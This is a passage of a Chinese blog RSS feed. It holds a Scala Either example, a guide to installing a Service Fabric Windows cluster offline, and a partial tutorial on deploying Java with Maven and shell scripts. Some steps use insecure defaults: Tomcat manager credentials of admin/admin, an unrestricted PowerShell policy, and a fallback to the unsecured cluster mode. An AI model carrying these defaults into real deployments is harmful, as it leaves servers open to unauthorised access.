&lt;span&gt; 5&lt;/span&gt;       &lt;span&gt;case&lt;/span&gt; Left(msg) =&amp;gt; println(&quot;查询用户失败，原因:&quot; +&lt;span&gt; msg)
&lt;/span&gt;&lt;span&gt; 6&lt;/span&gt; &lt;span&gt;    }
&lt;/span&gt;&lt;span&gt; 7&lt;/span&gt; &lt;span&gt;  }
&lt;/span&gt;&lt;span&gt; 8&lt;/span&gt; 
&lt;span&gt; 9&lt;/span&gt;   def getUserByEmail(email: String): Either[String, User] =&lt;span&gt; {
&lt;/span&gt;&lt;span&gt;10&lt;/span&gt;     &lt;span&gt;if&lt;/span&gt;&lt;span&gt; (email无效) {
&lt;/span&gt;&lt;span&gt;11&lt;/span&gt;       &lt;span&gt;return&lt;/span&gt; Left(&quot;邮箱格式错误&quot;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;12&lt;/span&gt;     } &lt;span&gt;else&lt;/span&gt;&lt;span&gt; {
&lt;/span&gt;&lt;span&gt;13&lt;/span&gt;       &lt;span&gt;if&lt;/span&gt;&lt;span&gt; (未查询到注册邮箱) {
&lt;/span&gt;&lt;span&gt;14&lt;/span&gt;         &lt;span&gt;return&lt;/span&gt; Left(&quot;该用户不存在&quot;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;15&lt;/span&gt;       } &lt;span&gt;else&lt;/span&gt;&lt;span&gt; {
&lt;/span&gt;&lt;span&gt;16&lt;/span&gt;         &lt;span&gt;return&lt;/span&gt;&lt;span&gt; Right(user)
&lt;/span&gt;&lt;span&gt;17&lt;/span&gt; &lt;span&gt;      }
&lt;/span&gt;&lt;span&gt;18&lt;/span&gt; &lt;span&gt;    }
&lt;/span&gt;&lt;span&gt;19&lt;/span&gt;   }
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;span&gt;&lt;strong&gt;=========================================&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;原文链接：&lt;/strong&gt;&lt;/span&gt;&lt;a id=&quot;cb_post_title_url&quot; class=&quot;singleposttitle&quot; href=&quot;https://www.cnblogs.com/PerkinsZhu/p/9450593.html&quot;&gt;scala中Either的一种使用场景&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;=========================================&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;-------end&lt;/p&gt;
</description>
<pubDate>Thu, 09 Aug 2018 14:28:00 +0000</pubDate>
<dc:creator>PerKins.Zhu</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/PerkinsZhu/p/9450593.html</dc:identifier>
</item>
<item>
<title>如何在本地数据中心安装Service Fabric for Windows集群 - 朱永光</title>
<link>http://www.cnblogs.com/redmoon/p/9452184.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/redmoon/p/9452184.html</guid>
<description>&lt;h2&gt;概述&lt;/h2&gt;
&lt;p&gt;首先本文只是对官方文档（&lt;a href=&quot;https://docs.microsoft.com/zh-cn/azure/service-fabric/service-fabric-cluster-creation-for-windows-server&quot;&gt;中文&lt;/a&gt;，&lt;a href=&quot;https://docs.microsoft.com/en-us/azure/service-fabric/service-fabric-cluster-creation-for-windows-server&quot;&gt;英文&lt;/a&gt;）的一个提炼，详细的安装说明还请仔细阅读官方文档。&lt;/p&gt;
&lt;p&gt;虽然Service Fabric的官方名称往往被加上Azure，但是实际上（估计很多人不知道）Service Fabric可以安装到本地数据中心或者任意公有云上，这不官方文档就有一章专门讲如何安装到AWS的内容。&lt;/p&gt;
&lt;p&gt;所以现在为了区分，一般把在Azure上提供的开箱即用的PaaS称之为Azure Service Fabric，而把本地安装的称之为Service Fabric Standalone。&lt;/p&gt;
&lt;p&gt;同时，Service Fabric既可部署到Windows Server上，也可以部署到Linux上。但是本文书写的时候，Linux版本只能使用Azure的，官方还没有发布本地版本安装包（但是未来一定会有）。所以本文也是仅限于Windows集群的内容。&lt;/p&gt;
&lt;p&gt;在本地数据中心安装Service Fabric for Windows集群的时候，可能会受到如下限制的影响：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;数据中心的服务器的网络是隔离的&lt;/li&gt;
&lt;li&gt;数据中心的服务器是不能访问互联网的&lt;/li&gt;
&lt;/ul&gt;&lt;h2&gt;环境准备&lt;/h2&gt;
&lt;p&gt;机器的准备，需要至少满足如下要求：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;最少16G内存&lt;/li&gt;
&lt;li&gt;最少40G硬盘空间&lt;/li&gt;
&lt;li&gt;4核以上CPU&lt;/li&gt;
&lt;li&gt;所有作为集群节点的机器在同一网段，互相可通&lt;/li&gt;
&lt;li&gt;机器上安装Windows Server 2012 R2或Windows Server 2016，如果打算使用容器，那么建议使用Windows Server 1805，可以支持更加小的1805基容器镜像。&lt;/li&gt;
&lt;li&gt;确保Windows安装了.NET FX 4.5.1以上&lt;/li&gt;
&lt;li&gt;确保Windows具有PowerShell 3.0&lt;/li&gt;
&lt;li&gt;在所有机器上确保运行RemoteRegistry服务&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;域环境和域账号：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;在数据中心中应该有一个域控&lt;/li&gt;
&lt;li&gt;创建一个普通域账号，比如：sfadmin&lt;/li&gt;
&lt;li&gt;把集群机器加入到域中（机器名可以命名为SFNode-01、SFNode-XX等等），并把sfadmin添加到集群机器的本地管理员组&lt;/li&gt;
&lt;li&gt;在域中创建一个机器组（全局安全组），比如：sfnodes，把所有集群机器都加到这个组中&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;虽然可以在某台集群机器上来运行Service Fabric的安装包，但是我建议单独使用一台操作机。操作机的准备：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;可以使用如下操作系统：&lt;/li&gt;
&lt;li&gt;
&lt;ul&gt;&lt;li&gt;Windows 7&lt;/li&gt;
&lt;li&gt;Windows 8/Windows 8.1&lt;/li&gt;
&lt;li&gt;Windows Server 2012 R2&lt;/li&gt;
&lt;li&gt;Windows Server 2016&lt;/li&gt;
&lt;li&gt;Windows 10&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;把操作机也加到域中&lt;/li&gt;
&lt;li&gt;和集群机器在一个网段，或者能够访问到集群机器&lt;/li&gt;
&lt;li&gt;启用PowerShell脚本执行权限：Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Force -Scope CurrentUser&lt;/li&gt;
&lt;li&gt;安装Service Fabric SDK。由于操作机可能也无法正常互联网，那么可以通过下载离线包的方式来获取SDK。&lt;/li&gt;
&lt;/ul&gt;&lt;h2&gt;安装包准备&lt;/h2&gt;
&lt;p&gt;Service Fabric for Windows的安装包分为两个部分：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;&lt;a href=&quot;http://go.microsoft.com/fwlink/?LinkId=730690&quot;&gt;Service Fabric Standalone Package - Windows Server&lt;/a&gt;，这个是安装程序。以下称之为安装包。&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://go.microsoft.com/fwlink/?linkid=839354&quot;&gt;Service Fabric Runtime - Windows Server&lt;/a&gt;，这个是安装到集群机器上的运行时。以下称之为运行包。&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;先通过其他渠道下载这两个安装包，然后复制到内网环境。&lt;/p&gt;
&lt;p&gt;在操作机上解压安装包的zip压缩包，比如解压到SFSetup文件夹。把运行包的cab压缩包也复制到SFSetup文件夹备用（不用解压）。&lt;/p&gt;
&lt;h2&gt;集群安装&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;首先，准备集群配置文件。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;根据不同的安全配置和集群配置，安装包提供了多个配置文件模板，分别是：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;ClusterConfig.gMSA.Windows.MultiMachine.json 依赖gMSA（Group Managed Service Account）安全机制的多机器集群&lt;/li&gt;
&lt;li&gt;ClusterConfig.Unsecure.DevCluster.json 非安全开发集群&lt;/li&gt;
&lt;li&gt;ClusterConfig.Unsecure.MultiMachine 非安全多机器集群&lt;/li&gt;
&lt;li&gt;ClusterConfig.Unsecure.OneNode 非安全单节点集群&lt;/li&gt;
&lt;li&gt;ClusterConfig.Windows.DevCluster 依赖Windows账号安全机制的开发集群&lt;/li&gt;
&lt;li&gt;ClusterConfig.Windows.MultiMachine 依赖Windows账号安全机制的多机器集群&lt;/li&gt;
&lt;li&gt;ClusterConfig.Windows.OneNode 依赖Windows账号安全机制的单节点集群&lt;/li&gt;
&lt;li&gt;ClusterConfig.Windows.X509.DevCluster 客户端访问依赖Windows账号服务器访问依赖X509证书的开发集群&lt;/li&gt;
&lt;li&gt;ClusterConfig.Windows.X509.MultiMachine 客户端访问依赖Windows账号服务器访问依赖X509证书的多机器集群&lt;/li&gt;
&lt;li&gt;ClusterConfig.Windows.X509.OneNode 客户端访问依赖Windows账号服务器访问依赖X509证书的单节点集群&lt;/li&gt;
&lt;li&gt;ClusterConfig.X509.DevCluster 依赖X509证书安全机制的开发集群&lt;/li&gt;
&lt;li&gt;ClusterConfig.X509.MultiMachine 依赖X509证书安全机制的多机器集群&lt;/li&gt;
&lt;li&gt;ClusterConfig.X509.OneNode 依赖X509证书安全机制的单节点集群&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;总结起来，Service Fabric for Windows支持非安全、Windows账号、组托管服务账号、X509证书和Windows账号+X509混合等5种安全模式。&lt;/p&gt;
&lt;p&gt;个人建议选择Windows账号模型，因为准备工作要简单一些，成功的机率也大一些。如果一直报莫名其妙的错误，那么使用非安全模式大概率可以成功。在网络安全比较严格且机器加入域的情况下，非安全模式也是可以接受的。&lt;/p&gt;
&lt;p&gt;以依赖Windows账号安全机制的多机器集群为例，复制一份ClusterConfig.Windows.MultiMachine.json文件，重命名为方便处理的名称，比如ThisClusterConfig.1.0.json。用诸如VSCode这样的编辑器打开这个json文件。编辑其中的nodes部分。主要是修改iPAddress为每台机器的机器名。ClusterIdentity填入机器组的名称sfnodes，Identity改为专用域账号的名称sfadmin。nodeTypes根据情况就暂时用一个或者自定义多个。&lt;/p&gt;
&lt;p&gt;示例如下：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://images2018.cnblogs.com/blog/601/201808/601-20180809221442671-420130955.png&quot;&gt;&lt;img title=&quot;image&quot; src=&quot;https://images2018.cnblogs.com/blog/601/201808/601-20180809221443356-875888788.png&quot; alt=&quot;image&quot; width=&quot;266&quot; height=&quot;484&quot; border=&quot;0&quot;/&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;对于非安全模式的集群，无非是去掉了security配置节而已。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;接着，对配置文件进行测试。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;在SFSetup文件夹上打开PowerShell，执行如下命令：&lt;/p&gt;
&lt;p&gt;.\TestConfiguration.ps1 -ClusterConfigFilePath .\ThisClusterConfig.1.0.json&lt;/p&gt;
&lt;p&gt;如果配置文件没有什么问题的话，会显示如下提示：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://images2018.cnblogs.com/blog/601/201808/601-20180809221443755-1742929078.png&quot;&gt;&lt;img title=&quot;image&quot; src=&quot;https://images2018.cnblogs.com/blog/601/201808/601-20180809221444236-481033624.png&quot; alt=&quot;image&quot; width=&quot;244&quot; height=&quot;182&quot; border=&quot;0&quot;/&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;在内网环境下，IsCabValid应该会显示为False的，这个不用担心。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;最后，基于配置文件创建集群。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;继续在PS中执行如下命令：&lt;/p&gt;
&lt;p&gt;.\CreateServiceFabricCluster.ps1 -ClusterConfigFilePath .\ThisClusterConfig.1.0.json –FabricRuntimePackagePath .\MicrosoftAzureServiceFabric.6.3.162.9494.cab&lt;/p&gt;
&lt;p&gt;现在祈祷它能一次运行成功，如果5台机器的话，应该能在5分钟内成功。&lt;/p&gt;
&lt;p&gt;提示成功后，通过输入如下命令来尝试连接集群的管理端口来进行验证：&lt;/p&gt;
&lt;p&gt;Connect-ServiceFabricCluster -ConnectionEndpoint SFNode-01.contoso.com:19000&lt;/p&gt;
&lt;p&gt;或者用浏览器打开管理后台：&lt;a href=&quot;http://SFNode-01.contoso.com:19080/Explorer/index.html&quot;&gt;http://SFNode-01.contoso.com:19080/Explorer/index.html&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;容器环境&lt;/h2&gt;
&lt;p&gt;如果你需要用Service Fabric来编排Windows Container的话，需要预先在集群机器上安装Docker。&lt;/p&gt;
&lt;p&gt;由于内网环境的限制，安装Docker也会稍显麻烦。根据Docker.com的官方文档：&lt;a title=&quot;https://docs.docker.com/install/windows/docker-ee/#use-a-script-to-install-docker-ee&quot; href=&quot;https://docs.docker.com/install/windows/docker-ee/#use-a-script-to-install-docker-ee&quot;&gt;https://docs.docker.com/install/windows/docker-ee/#use-a-script-to-install-docker-ee&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;可以通过命令启用Windows的容器支持：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;(Install-WindowsFeature Containers).RestartNeeded&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;再下载docker的离线包到内网环境后按照步骤进行安装。&lt;/p&gt;
&lt;p&gt;同时为了支持集群机器能够正常的获取Docker镜像，可以在内网环境运行一个Docker Registry作为私有镜像仓库供内部应用镜像的存放处，在外网运行一个Docker Registry作为公共镜像的Mirror，供私有仓库和集群机器使用。&lt;/p&gt;
</description>
<pubDate>Thu, 09 Aug 2018 14:15:00 +0000</pubDate>
<dc:creator>朱永光</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/redmoon/p/9452184.html</dc:identifier>
</item>
<item>
<title>Java代码自动部署 - it小熊</title>
<link>http://www.cnblogs.com/xiongshx/p/9450680.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/xiongshx/p/9450680.html</guid>
<description>&lt;h2&gt;【 ①Java代码自动部署-总结简介】&lt;/h2&gt;
&lt;p&gt;       代码部署是每一个软件开发项目组都会有的一个流程，也是从开发环节到发布功能必不可少的环节。对于Java开发者来说，Java代码的发布部署也是经常需要做的一件事，特别是互联网公司。代码的发布上线关系到保证生产环境能够正常启动及功能是否能正常运行，所以代码部署在整个项目开发周期还是占据很重要的地位。&lt;/p&gt;
&lt;p&gt;       由于本人近期在学习Java代码自动发布相关的知识，此系列文章是对此次学习到的知识进行巩固和总结；同时，也希望能够帮助到和我一样对此方面知识感兴趣的同行们。言不多说，直接进入真题。下面针对此次系列文章做一个简要的概述。&lt;/p&gt;
&lt;h3&gt;1、学习代码自动部署的目的&lt;/h3&gt;
&lt;p&gt;       高效且简化代码的部署发布&lt;/p&gt;
&lt;h3&gt;2、使用的相关工具及技术&lt;/h3&gt;
&lt;p&gt;       1、 CentOS操作系统（可以使用虚拟机安装Linux系统）&lt;/p&gt;
&lt;p&gt;       2、 Maven&lt;/p&gt;
&lt;p&gt;       3、 Git&lt;/p&gt;
&lt;p&gt;       4、 Shell脚本&lt;/p&gt;
&lt;p&gt;       5、 Jenkins&lt;/p&gt;
&lt;h3&gt;3、学习代码自动发布相关技术的顺序&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1114800/201808/1114800-20180809212913209-71627611.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;    阶段1：&lt;/p&gt;
&lt;p&gt;    优点：部署流程简单方面，开发完成后开发人员在开发环境即可进行代码部署上线。&lt;/p&gt;
&lt;p&gt;    缺点：发布流程粗糙，代码部署不够严谨，不建议生产环境使用此方式。&lt;/p&gt;
&lt;p&gt;    阶段2：&lt;/p&gt;
&lt;p&gt;    优点：由Git进行项目版本管理，降低了代码发布的风险，发布过程有运维人员进行发布。&lt;/p&gt;
&lt;p&gt;    缺点：由于代码的发布由运维人员发布，需开发人员配合进行代码发布部署，与发布部署不成功，得由开发人员查找问题，增加了部署复杂性。&lt;/p&gt;
&lt;p&gt;    阶段3：&lt;/p&gt;
&lt;p&gt;    优点：由Jenkins工具进行代码的发布部署，规范了代码的发布流程，提供可视工具监听整个发布流程等。&lt;/p&gt;
&lt;p&gt;    缺点：对技术要求更高了，需要了解Jenkins工具，会编写Shell脚本等。&lt;/p&gt;
&lt;h3&gt;4、Java代码自动部署总结分为以下系列&lt;/h3&gt;
&lt;p&gt;        ①总结简介&lt;/p&gt;
&lt;p&gt;        ②使用Maven进行代码部署&lt;/p&gt;
&lt;p&gt;        ③使用Shell进行代码部署&lt;/p&gt;
&lt;p&gt;        ④使用Jenkins进行代码部署&lt;/p&gt;
&lt;p&gt;        ⑤课程总结及心得&lt;/p&gt;
&lt;h2&gt;【 ②使用Maven进行代码部署】&lt;/h2&gt;
&lt;p&gt;       在使用maven进行代码发布的时候，需要用Maven工具的相关插件将需要部署的项目发布到指定的服务器的部署目录中。&lt;/p&gt;
&lt;p&gt;在学习此技术时，我用的的是一个秒杀项目的ssm版，大家在学学习此技术的时候可以用简单一点的Maven项目进行测试。因本项目是学习如何进行部署项目技术的，本次就针对具体项目进行介绍。&lt;/p&gt;
&lt;h3&gt;1、 使用Maven进行部署项目要求&lt;/h3&gt;
&lt;p&gt;    1) 项目本身属于Maven项目（必要条件）&lt;/p&gt;
&lt;p&gt;    2) 需要部署的是war包&lt;/p&gt;
&lt;p&gt;    3) 引入插件&lt;/p&gt;
&lt;p&gt;    在需要部署的项目的pom,xml文件中引入tomcat插件,在project-&amp;gt;build-&amp;gt; plugins节点引入tomcat插件。&lt;/p&gt;
&lt;table border=&quot;1&quot; cellspacing=&quot;0&quot; cellpadding=&quot;0&quot;&gt;&lt;tbody readability=&quot;2.5&quot;&gt;&lt;tr readability=&quot;23&quot;&gt;&lt;td valign=&quot;top&quot; width=&quot;571&quot; readability=&quot;39&quot;&gt;
&lt;p align=&quot;left&quot;&gt;&amp;lt;build&amp;gt;&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;   &amp;lt;plugins&amp;gt;&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;      &amp;lt;plugin&amp;gt;&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;         &amp;lt;groupId&amp;gt;org.apache.tomcat.maven&amp;lt;/groupId&amp;gt;&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;         &amp;lt;!-- 引入&lt;span&gt;tomcat&lt;/span&gt;插件 --&amp;gt;&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;         &amp;lt;artifactId&amp;gt;tomcat7-maven-plugin&amp;lt;/artifactId&amp;gt;&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;         &amp;lt;configuration&amp;gt;&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;            &amp;lt;!-- &lt;span&gt;&amp;lt;url&amp;gt;&lt;/span&gt;http://localhost:8080/manager&amp;lt;/url&amp;gt; --&amp;gt;         &amp;lt;!-- tomcat6部署管理路径 --&amp;gt;&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;            &amp;lt;url&amp;gt;http://192.168.25.133:8080/manager/text&amp;lt;/url&amp;gt;        &amp;lt;!-- tomcat7部署管理路径 --&amp;gt;&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;            &amp;lt;!-- &lt;span&gt;tomcat&lt;/span&gt;控制台账号 --&amp;gt;&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;            &amp;lt;username&amp;gt;admin&amp;lt;/username&amp;gt;                                &amp;lt;!-- &lt;span&gt;tomcat&lt;/span&gt;的管理员账号 --&amp;gt;&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;            &amp;lt;!-- &lt;span&gt;tomcat&lt;/span&gt;控制台密码--&amp;gt;&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;            &amp;lt;password&amp;gt;admin&amp;lt;/password&amp;gt;&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;            &amp;lt;!-- 本地运行时指定的端口号  --&amp;gt;&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;            &amp;lt;port&amp;gt;8080&amp;lt;/port&amp;gt;&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;            &amp;lt;path&amp;gt;/seckill-manager&amp;lt;/path&amp;gt;                            &amp;lt;!-- 部署路径 --&amp;gt;&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;            &amp;lt;charset&amp;gt;UTF-8&amp;lt;/charset&amp;gt;&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;            &amp;lt;encoding&amp;gt;UTF-8&amp;lt;/encoding&amp;gt;&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;         &amp;lt;/configuration&amp;gt;&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;      &amp;lt;/plugin&amp;gt;&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;   &amp;lt;/plugins&amp;gt;&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;&amp;lt;/build&amp;gt;&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;   4) 执行Maven的redeploy操作&lt;/p&gt;
&lt;p&gt;   执行的命令：tomcat7:redeploy&lt;/p&gt;
&lt;p&gt;   在eclipse下配置的命令如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1114800/201808/1114800-20180809213937276-698838783.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;h3&gt;2、需要注意的问题点&lt;/h3&gt;
&lt;p&gt;　　1、在将项目发布到远程Tomcat时需要启动远程Tomcat管理控制台账号&lt;/p&gt;
&lt;p&gt;　　开启tomcat管理控制台账号地址为：Tomcat安装目录/conf/tomcat-users.xml文件&lt;/p&gt;
&lt;p&gt;　　在tomcat-users.xml文件中需要配置允许访问纯文本接口权限，以便maven的tomat插件能够通过此方式进行部署项目。&lt;/p&gt;
&lt;p&gt;　　在tomcat-users节点新增role属性和user属性，如下：&lt;/p&gt;
&lt;table border=&quot;1&quot; cellspacing=&quot;0&quot; cellpadding=&quot;0&quot;&gt;&lt;tbody readability=&quot;2&quot;&gt;&lt;tr readability=&quot;7.5&quot;&gt;&lt;td valign=&quot;top&quot; width=&quot;553&quot; readability=&quot;10&quot;&gt;
&lt;p&gt;&amp;lt;role rolename=&quot;manager-script&quot; /&amp;gt;&lt;/p&gt;
&lt;p&gt;&amp;lt;role rolename=&quot;manager-gui&quot;/&amp;gt;&lt;/p&gt;
&lt;p&gt;&amp;lt;user username=&quot;admin&quot; password=&quot;admin&quot; roles=&quot;manager-gui,manager-script&quot;/&amp;gt;&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;&lt;strong&gt;&lt;span&gt;　　解释：给账号admin配置manager-script及manager-gui权限&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　　Tomcat角色解释图:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1114800/201808/1114800-20180809214107764-1137576949.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　2、在需要远程发布到的目标Tomcat应该是运行状态，保证Maven的tomcat插件能够访问到目标Tomcat完成项目的部署。&lt;/p&gt;

&lt;h2&gt;【③使用Shell进行代码部署】&lt;/h2&gt;
&lt;p&gt;　　在使用Shell脚本进行重新部署项目时，需要掌握Shell脚本的编写，Shell脚本需要完成以下功能：&lt;/p&gt;
&lt;p&gt;　　1、 将代码clone到服务器指定目录&lt;/p&gt;
&lt;p&gt;　　2、 根据pom.xml文件将代码打包成war包&lt;/p&gt;
&lt;p&gt;　　3、 将war发布到指定服务器&lt;/p&gt;

&lt;p&gt;　　环境要求：&lt;/p&gt;
&lt;p&gt;　　1、 安装Maven并配置环境变量&lt;/p&gt;
&lt;p&gt;　　2、 Git客户端，并配置环境变量&lt;/p&gt;
&lt;p&gt;　　3、 熟悉Shell脚本相关知识&lt;/p&gt;
&lt;h3&gt;　　1、编写Shell脚本&lt;/h3&gt;
&lt;p&gt;　　在Linux的指定目录新建shell脚本,我是在项目的专用tomcat根目录新建了shell脚本，方便进行tomcat集群部署操作。脚本内容如下：&lt;/p&gt;
&lt;table border=&quot;1&quot; cellspacing=&quot;0&quot; cellpadding=&quot;0&quot;&gt;&lt;tbody readability=&quot;2.5&quot;&gt;&lt;tr readability=&quot;37&quot;&gt;&lt;td valign=&quot;top&quot; width=&quot;586&quot; readability=&quot;67&quot;&gt;
&lt;p&gt;#!/bin/bash&lt;/p&gt;
&lt;p&gt;#shell功能概要:seckill的service提供者构建shell&lt;/p&gt;
&lt;p&gt;#发布service提供者的服务器的进程名&lt;/p&gt;
&lt;p&gt;serverName=&quot;seckill_provider&quot;&lt;/p&gt;
&lt;p&gt;#获取发布service提供者的服务器的进程PID&lt;/p&gt;
&lt;p&gt;PID=$(ps -ef | grep $serverName | grep -v grep | awk '{ print $2 }')&lt;/p&gt;
&lt;p&gt;#java代码本地仓库地址&lt;/p&gt;
&lt;p&gt;javaBaseSrc=&quot;/opt/java_project_src/&quot;&lt;/p&gt;
&lt;p&gt;#项目路径&lt;/p&gt;
&lt;p&gt;javaProjectSrc=&quot;sekill/seckill-manager/seckill-service/target/seckill-service.war&quot;&lt;/p&gt;
&lt;p&gt;#发布的tomcat集群，数组方式存储&lt;/p&gt;
&lt;p&gt;projectServicersPath=(/opt/seckill-tomcat/seckill-tomcat-02 /opt/seckill-tomcat/seckill-tomcat-03)&lt;/p&gt;
&lt;p&gt;projectName=&quot;sekill&quot;&lt;/p&gt;
&lt;p&gt;#循环强制停止指定tomcat&lt;/p&gt;
&lt;p&gt;for var in ${PID};&lt;/p&gt;
&lt;p&gt;do&lt;/p&gt;
&lt;p&gt;  echo &quot;准备强制停止PID:$var&quot;&lt;/p&gt;
&lt;p&gt;  kill -9 $var&lt;/p&gt;
&lt;p&gt;done&lt;/p&gt;
&lt;p&gt;echo &quot;kill $serverName sucess&quot;&lt;/p&gt;
&lt;p&gt;#切换到git本地仓库目录&lt;/p&gt;
&lt;p&gt;cd $javaBaseSrc&lt;/p&gt;
&lt;p&gt;#删除仓库库中代码&lt;/p&gt;
&lt;p&gt;rm -rf $projectName&lt;/p&gt;
&lt;p&gt;echo &quot;从/opt/java_project_src仓库中删除项目$projectName成功&quot;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;#从远程仓库下载代码，因涉及到账户信息，此处更改为描述信息&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;git clone 远程git仓库项目URL&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;cd $javaBaseSrc/sekill/seckill-manager&lt;/p&gt;
&lt;p&gt;#安装项目并跳过测试&lt;/p&gt;
&lt;p&gt;mvn -Dmaven.test.skip=true clean install&lt;/p&gt;
&lt;p&gt;#判断执行上面mvn操作的返回值是否为0&lt;/p&gt;
&lt;p&gt;if [ $? -ne 0 ]&lt;/p&gt;
&lt;p&gt;then&lt;/p&gt;
&lt;p&gt;  echo &quot;构建失败，请查看代码问题！&quot;&lt;/p&gt;
&lt;p&gt;  exit 1;&lt;/p&gt;
&lt;p&gt;fi&lt;/p&gt;
&lt;p&gt;#循环将项目部署到集群tomcat中&lt;/p&gt;
&lt;p&gt;for projectServicer in ${projectServicersPath[@]}&lt;/p&gt;
&lt;p&gt;do&lt;/p&gt;
&lt;p&gt;       cp $javaBaseSrc$javaProjectSrc $projectServicer/webapps&lt;/p&gt;
&lt;p&gt;       echo &quot;$projectServicer 代码发布成功!&quot;&lt;/p&gt;
&lt;p&gt;       sh $projectServicer/bin/startup.sh&lt;/p&gt;
&lt;p&gt;       if [ $? -ne 0 ]&lt;/p&gt;
&lt;p&gt;       then&lt;/p&gt;
&lt;p&gt;         echo &quot;$projectServicer 启动失败&quot;&lt;/p&gt;
&lt;p&gt;         exit 1;&lt;/p&gt;
&lt;p&gt;       else&lt;/p&gt;
&lt;p&gt;         echo &quot;$projectServicer 启动成功&quot;;&lt;/p&gt;
&lt;p&gt;       fi&lt;/p&gt;
&lt;p&gt;done&lt;/p&gt;
&lt;p&gt;echo &quot;启动 $serverName 成功&quot;&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;h3&gt;&lt;span&gt;　　2、需要注意的问题点&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;　　在编写Shell脚本时需要知道每句Shell的含义，尽可能将所有问题点都能考虑到，比如：&lt;/p&gt;
&lt;p&gt;　　a) 强杀进程问题&lt;/p&gt;
&lt;p&gt;　　进行PID=$(ps -ef | grep $serverName | grep -v grep | awk '{ print $2 }')时，要确定查询的只是目标Tomcat的进程pid，防止在后续强制停止时将其他应用Tomcat误强行停止，这里建  议给每一个目标Tomcat设置指定的进程名，设置方法为：&lt;/p&gt;
&lt;p&gt;　　在指定tomcat的bin/ setclasspath.sh文件中找到if [ -z &quot;$_RUNJAVA&quot; ]判断语句，进行以下设置即可&lt;/p&gt;
&lt;table border=&quot;1&quot; cellspacing=&quot;0&quot; cellpadding=&quot;0&quot;&gt;&lt;tbody readability=&quot;3&quot;&gt;&lt;tr readability=&quot;11.5&quot;&gt;&lt;td valign=&quot;top&quot; width=&quot;586&quot; readability=&quot;14&quot;&gt;
&lt;p&gt;if [ -z &quot;$_RUNJAVA&quot; ]; then&lt;/p&gt;
